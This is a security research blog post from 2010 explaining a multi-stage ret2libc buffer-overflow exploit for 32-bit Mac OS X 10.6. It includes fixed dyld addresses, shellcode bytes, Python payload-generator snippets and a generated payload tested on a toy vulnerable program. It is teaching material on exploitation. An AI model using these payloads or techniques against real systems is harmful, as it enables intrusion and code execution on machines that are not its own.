---
title: Simple Mac OS X ret2libc exploit (x86)
author: longld
layout: post

shorturls:
  - 'a:4:{s:5:"bitly";s:0:"";s:9:"permalink";s:71:"http://www.vnsecurity.net/2010/10/simple-mac-os-x-ret2libc-exploit-x86/";s:7:"tinyurl";s:26:"http://tinyurl.com/35yhmfz";s:4:"isgd";s:18:"http://is.gd/fUAZp";}'
tweetbackscheck:
  - 1408358974
aktt_notify_twitter:
  - no
twittercomments:
  - 'a:32:{i:26539715084;s:7:"retweet";i:26538286221;s:7:"retweet";i:26536522154;s:7:"retweet";i:26520380144;s:7:"retweet";i:26514897500;s:7:"retweet";i:26513100946;s:7:"retweet";i:26504151439;s:3:"430";i:26495351449;s:3:"431";i:26493490627;s:7:"retweet";i:26489800605;s:7:"retweet";i:26481180070;s:7:"retweet";i:26481124490;s:7:"retweet";i:26481072636;s:7:"retweet";i:26481059761;s:7:"retweet";i:26480946053;s:7:"retweet";i:26480917203;s:7:"retweet";i:26479334248;s:7:"retweet";i:26479224531;s:7:"retweet";i:26478784886;s:7:"retweet";i:26476778418;s:7:"retweet";i:26472792944;s:7:"retweet";i:26466344621;s:7:"retweet";i:26466033093;s:7:"retweet";i:26466030274;s:7:"retweet";i:26464938746;s:7:"retweet";i:26464387128;s:7:"retweet";i:26463995575;s:7:"retweet";i:26463608056;s:7:"retweet";i:26442315197;s:7:"retweet";i:26437569074;s:7:"retweet";i:26437440169;s:7:"retweet";i:26437166351;s:7:"retweet";}'
tweetcount:
  - 32
category:
  - research
tags:
  - OSX
  - return-oriented-programming
  - return-to-libc
  - ropeme
---
Talking about buffer overflow exploit on x86, Mac OS X is the most easy and hacker friendly target compare to Linux or Windows. OS X always loads **/usr/lib/dyld **at a fixed location and it contains a lot of helper stubs to launch the exploit. If you want something advanced likes ROP (Return-Oriented-Programming) exploit you may have a look at &#8220;<a href="http://trailofbits.com/2010/07/21/mac-os-x-return-oriented-exploitation/" target="_blank">Mac OS X Return-Oriented Exploitation</a>&#8221; and thorough step-by-step guide &#8220;<a href="http://www.exploit-db.com/osx-rop-exploits-evocam-case-study/" target="_blank">OSX ROP Exploit – EvoCam Case Study</a>&#8220;. But actually, we don&#8217;t need ROP for 32-bit exploitation on OS X, simple ret2libc is enough and straightforward to implement. Let take a look at multi-stage ret2libc exploit on OS X.

## The target

Under OSX, dyld is always loaded at a fixed location with __IMPORT page is RWX as shown below:

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__LINKEDIT             8fe70000-8fe84000 [   80K] r&#8211;/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
</div>

<pre><strong>__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld</strong>
__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
__LINKEDIT             8fe70000-8fe84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
<strong>__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld</strong></pre>

<span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">Our target is to transfer the desired shellcode to the __IMPORT section of dyld then execute it. We can simply do this with byte-per-byte copy way of <a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/">ROPEME</a>. There is some disadvantages with this method:</span>

<span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px"> </span>

*   Payload size is large, around 10 times of actual shellcode
*   We have to re-generate the whole payload when changing to new shellcode

With OS X we can do it better as there is a RWX page at static location.

## Staging payload

The most complicated part of ROP technique is &#8220;stack pivoting&#8221; or ESP register control under ASLR. By executing a small shellcode we can take ESP under control easily. Our multi-stage payload will look like:

### Stage-2: actual shellcode

This is the last stage in our multi-stage payload. Any NULL-free shellcode can be used, e.g bind shell code from Metasploit.

### Stage-1: shellcode loader for stage-2 payload

This stage will transfer stage-2 payload on stack to __IMPORT section (RWX) of dyld then executes it. The transfer function is *_strcpy() *in dyld. Below small shellcode will be executed on RWX page to perform the job:

<pre># 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # src -&gt; &shellcode
# 50                push eax    # dst -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &shellcode)</pre>

### Stage-0: ret2libc loader for stage-1 payload

This stage will transfer 7 bytes of stage-1 payload to our RWX location using repeated *_strcpy() *calls, then executes it. We lookups the dyld for necessary byte values and copy it to the target byte-per-byte.

In summary, there is some advantages with our multi-stage payload:

*   Straightforward to implement: only ret2libc calls, no gadget is required
*   Payload size overhead is small: around 100 bytes
*   Independent, generic loader code: no need to regenerate the whole payload, just append a new shellcode to make new payload

## Automated payload generator

Let put all this together and make an automated payload generator in Python.

*   Select the target

<pre class="brush: python; title: ; notranslate" title="">#__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
TARGET = 0x8fe6f010 # to avoid NULL byte
# dyld base address
DYLDADDR = 0x8fe00000
</pre>

*   Extract dyld&#8217;s i386 code

<pre class="brush: python; title: ; notranslate" title=""># $ otool -f /usr/lib/dyld
# ...
#architecture 1
#    cputype 7
#    cpusubtype 3
#    capabilities 0x0
#    offset 352256
#    size 368080
#    align 2^12 (4096)
# ...

DYLDFILE = "/usr/lib/dyld"
DYLDCODE = open(DYLDFILE, "rb").read()
DYLDCODE = DYLDCODE[352256 : 352256+368080]
</pre>

*   _strcpy() call

<pre class="brush: python; title: ; notranslate" title=""># $ nm -arch i386 /usr/lib/dyld | grep _strcpy
# 8fe2db10 t _strcpy
STRCPY = 0x8fe2db10

# $ otool -arch i386 -tv /usr/lib/dyld | grep pop -A2 | grep ret -B1 | grep pop
# 8fe28790        popl    %edi
# 8fe2b3d4        popl    %edi
POP2RET = 0x8fe2878f
</pre>

*   stage-1

<pre class="brush: python; title: ; notranslate" title=""># stage1
# 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # dst -&gt; &shellcode
# 50                push eax    # src -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &shellcode)

STAGE1 = "x58x5bx54x50x50x53xc3"
</pre>

*   stage-0

<pre class="brush: python; title: ; notranslate" title=""># stage0: _strcpy sequences
STAGE0 = gen_stage0(DYLDCODE, STAGE1)
</pre>

Below is the stage-0 payload loader generated for OS X 10.6.4:

<pre class="brush: python; title: ; notranslate" title="">STAGE0 = (  "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8f"
            "x10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" )
</pre>

Test the payload with simple buffer overflow:

<pre class="brush: plain; title: ; notranslate" title="">bash-3.2$ ./vuln "`python -c 'print "A"*272 + "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8fx10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8fx10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8fx10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8fx10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8fx10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" + "xcc"*4'`

...

Trace/BPT trap

bash-3.2$

</pre>

Looking for the next? Maybe &#8220;Mac OS X ROP exploit on x86_64&#8243; someday.